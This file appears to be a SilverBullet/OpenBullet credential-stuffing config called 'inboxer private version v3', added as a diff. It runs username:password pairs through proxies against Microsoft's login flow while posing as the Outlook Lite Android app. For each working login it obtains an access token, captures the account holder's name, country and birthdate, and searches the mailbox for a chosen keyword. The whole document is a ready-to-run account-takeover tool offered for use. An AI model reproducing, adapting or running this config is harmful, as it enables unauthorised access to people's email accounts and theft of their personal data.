@@ -1,0 +1,272 @@
+[SETTINGS]
+{
+  "Name": "inboxer private version v3",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2025-11-18T16:34:04.6381813+03:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@callmepooh",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "put ur keyword",
+      "VariableName": "key",
+      "Id": 2098879135
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "inboxer private version v3",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#STEP_GENERATE_GUID FUNCTION GenerateGUID -> VAR "UUID" 
+
+#STEP_GET_IDP REQUEST GET "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=<USER>" 
+  
+  HEADER "X-OneAuth-AppName: Outlook Lite" 
+  HEADER "X-Office-Version: 3.11.0-minApi24" 
+  HEADER "X-CorrelationId: <UUID>" 
+  HEADER "X-Office-Application: 145" 
+  HEADER "X-OneAuth-Version: 1.83.0" 
+  HEADER "X-Office-Platform: Android" 
+  HEADER "X-Office-Platform-Version: 28" 
+  HEADER "Enlightened-Hrd-Client: 0" 
+  HEADER "X-OneAuth-AppId: com.microsoft.outlooklite" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)" 
+  HEADER "Host: odc.officeapps.live.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+#KEYCHECK_IDP KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Neither" 
+    KEY "Both" 
+    KEY "Placeholder" 
+    KEY "OrgId" 
+  KEYCHAIN Success OR 
+    KEY "MSAccount" 
+
+#STEP_GET_AUTH REQUEST GET "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=<USER>&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D" 
+  
+  HEADER "Host: login.microsoftonline.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "return-client-request-id: false" 
+  HEADER "client-request-id: 205740b4-7709-4500-a45b-b8e12f66c738" 
+  HEADER "x-ms-sso-ignore-sso: 1" 
+  HEADER "correlation-id: <UUID>" 
+  HEADER "x-client-ver: 1.1.0+9e54a0d1" 
+  HEADER "x-client-os: 28" 
+  HEADER "x-client-sku: MSAL.xplat.android" 
+  HEADER "x-client-src-sku: MSAL.xplat.android" 
+  HEADER "X-Requested-With: com.microsoft.outlooklite" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#PARSE_URL PARSE "<SOURCE>" LR "urlPost\":\"" "\"" -> VAR "URL" 
+
+#PARSE_PPFT PARSE "<SOURCE>" LR "name=\\\"PPFT\\\" id=\\\"i0327\\\" value=\\\"" "\"" -> VAR "PPFT" 
+
+#PARSE_AD PARSE "<ADDRESS>" LR "" "haschrome=1" -> VAR "AD" 
+
+#FUNCTION_LEN FUNCTION Constant "i13=1&login=<USER>&loginfmt=<USER>&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PASS>&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=<PPFT>&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960" -> VAR "LEN" 
+
+#STEP_POST_LOGIN REQUEST POST "<URL>" AutoRedirect=FALSE 
+  CONTENT "i13=1&login=<USER>&loginfmt=<USER>&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PASS>&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=<PPFT>&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: login.live.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: <LEN>" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Origin: https://login.live.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "X-Requested-With: com.microsoft.outlooklite" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: <AD>haschrome=1" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cookie: MSPRequ=<COOKIES(MSPRequ)>; uaid=<COOKIES(uaid)>; RefreshTokenSso=<COOKIES(RefreshTokenSso)>; MSPOK=<COOKIES(MSPOK)>; OParams=<COOKIES(OParams)>; MicrosoftApplicationsTelemetryDeviceId=<UUID>" 
+
+#FUNCTION_COUNT_ERRORS FUNCTION CountOccurrences "error" "<SOURCE>" -> VAR "ERRORS" 
+
+#KEYCHECK_LOGIN KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains "JSH" 
+    KEY "<COOKIES{*}>" Contains "JSHP" 
+    KEY "<COOKIES{*}>" Contains "ANON" 
+    KEY "<COOKIES{*}>" Contains "WLSSC" 
+    KEY "<ADDRESS>" Contains "https://login.live.com/oauth20_desktop.srf?" 
+    KEY "fntobu-y" 
+  KEYCHAIN Failure OR 
+    KEY "account or password is incorrect" 
+    KEY "<ERRORS>" GreaterThan "0" 
+  KEYCHAIN Failure OR 
+    KEY "https://account.live.com/identity/confirm" 
+    KEY "action=\"https://account.live.com/Consent/Update" 
+  KEYCHAIN Failure OR 
+    KEY "https://account.live.com/recover" 
+  KEYCHAIN Failure OR 
+    KEY "https://account.live.com/Abuse" 
+    KEY "<ADDRESS>" Contains "https://login.live.com/finisherror.srf" 
+  KEYCHAIN Ban OR 
+    KEY "too many times with" 
+
+#KEYCHECK_ERROR KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "<ERRORS>" GreaterThan "0" 
+
+#PARSE_AUTH_CODE PARSE "<HEADERS(Location)>" LR "code=" "&" -> VAR "Code" 
+
+#PARSE_MSPCID PARSE "<COOKIES(MSPCID)>" LR "" "" -> VAR "MSPCID" 
+
+#FUNCTION_CID FUNCTION ToUppercase "<MSPCID>" -> VAR "CID" 
+
+#STEP_TOKEN REQUEST POST "https://login.microsoftonline.com/consumers/oauth2/v2.0/token" AutoRedirect=FALSE 
+  CONTENT "client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=<Code>&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+
+#KEYCHECK_TOKEN KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+
+#PARSE_ATK PARSE "<SOURCE>" JSON "access_token" -> VAR "ATK" 
+
+#STEP_GET_PROFILE REQUEST GET "https://substrate.office.com/profileb2/v2.0/me/V1Profile" 
+  
+  HEADER "User-Agent: Outlook-Android/2.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "ForceSync: false" 
+  HEADER "Authorization: Bearer <ATK>" 
+  HEADER "X-AnchorMailbox: CID:<CID>" 
+  HEADER "Host: substrate.office.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+#PARSE_COUNTRY PARSE "<SOURCE>" JSON "location" CreateEmpty=FALSE -> CAP "Country" 
+
+#PARSE_NAME PARSE "<SOURCE>" JSON "displayName" CreateEmpty=FALSE -> CAP "Name" 
+
+#PARSE_BIRTH_DAY PARSE "<SOURCE>" JSON "birthDay" -> VAR "1" 
+
+#PARSE_BIRTH_MONTH PARSE "<SOURCE>" JSON "birthMonth" -> VAR "2" 
+
+#PARSE_BIRTH_YEAR PARSE "<SOURCE>" JSON "birthYear" -> VAR "3" 
+
+#STEP_BIRTHDATE FUNCTION Constant "<1>-<2>-<3>" -> CAP "Birthdate" 
+
+#STEP_STARTUP REQUEST POST "https://outlook.live.com/owa/<USER>/startupdata.ashx?app=Mini&n=0" 
+  CONTENT "" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: outlook.live.com" 
+  HEADER "content-length: 0" 
+  HEADER "x-owa-sessionid: <UUID>" 
+  HEADER "x-req-source: Mini" 
+  HEADER "authorization: Bearer <ATK>" 
+  HEADER "user-agent: Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36" 
+  HEADER "action: StartupData" 
+  HEADER "x-owa-correlationid: <UUID>" 
+  HEADER "ms-cv: YizxQK73vePSyVZZXVeNr+.3" 
+  HEADER "content-type: application/json; charset=utf-8" 
+  HEADER "accept: */*" 
+  HEADER "origin: https://outlook.live.com" 
+  HEADER "x-requested-with: com.microsoft.outlooklite" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "referer: https://outlook.live.com/" 
+  HEADER "accept-encoding: gzip, deflate" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+
+#PARSE_JUNK PARSE "<SOURCE>" LR "JunkSelected\":true,\"CheckForReportJunkDialog\":false,\"FrequentlyUsedFolders\":[\"{\\\"FolderId\\\":\\\"" "\\\"" -> VAR "JUNK" 
+
+#STEP_SEARCH REQUEST POST "https://outlook.live.com/searchservice/api/v2/query?n=88&cv=z%2B4rC2Rg7h%2BxLG28lplshj.124" 
+  CONTENT "{\"Cvid\": \"49c85090-df47-7cfc-7dff-b6f493b9eaec\",\"Scenario\":{\"Name\":\"owa.react\"},\"TimeZone\":\"Pacific Standard Time\",\"TextDecorations\":\"Off\",\"EntityRequests\":[{\"EntityType\":\"Conversation\",\"ContentSources\":[\"Exchange\"],\"Filter\":{\"Or\":[{\"Term\":{\"DistinguishedFolderName\":\"msgfolderroot\"}},{\"Term\":{\"DistinguishedFolderName\":\"DeletedItems\"}}]},\"From\":0,\"Query\":{\"QueryString\":\"<key>\"},\"RefiningQueries\":null,\"Size\":25,\"Sort\":[{\"Field\":\"Score\",\"SortDirection\":\"Desc\",\"Count\":3},{\"Field\":\"Time\",\"SortDirection\":\"Desc\"}],\"EnableTopResults\":true,\"TopResultsCount\":3}],\"QueryAlterationOptions\":{\"EnableSuggestion\":true,\"EnableAlteration\":true,\"SupportedRecourseDisplayTypes\":[\"Suggestion\",\"NoResultModification\",\"NoResultFolderRefinerModification\",\"NoRequeryModification\",\"Modification\"]},\"LogicalId\":\"50288413-6c68-e7d3-ab47-2be5431628f2\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Outlook-Android/2.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "ForceSync: false" 
+  HEADER "Authorization: Bearer <ATK>" 
+  HEADER "X-AnchorMailbox: CID:<CID>" 
+  HEADER "Host: substrate.office.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+#PARSE_TOTAL PARSE "<SOURCE>" JSON "Total" -> VAR "total" 
+
+#KEYCHECK_EMPTY KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "Empty" OR 
+    KEY "<total>" Contains "0" 
+
+#PARSE_LAST_DATE PARSE "<SOURCE>" LR "LastDeliveryOrRenewTime\":\"" "T" -> VAR "LAST DATE MSG FROM" 
+
+#STEP_SET_MSG IF "<SOURCE>" contains "HitHighlightedSummary"
+SET CAP "HAVE MSG FROM <key>" "✔️"
+SET CAP "TOTAL MSG FROM <key>" "<total>"
+SET CAP "LAST DATE MSG FROM <key>" "<LAST DATE MSG FROM>"
+ELSE
+SET CAP "HAVE MSG FROM <key>" "❌"
+ENDIF
+
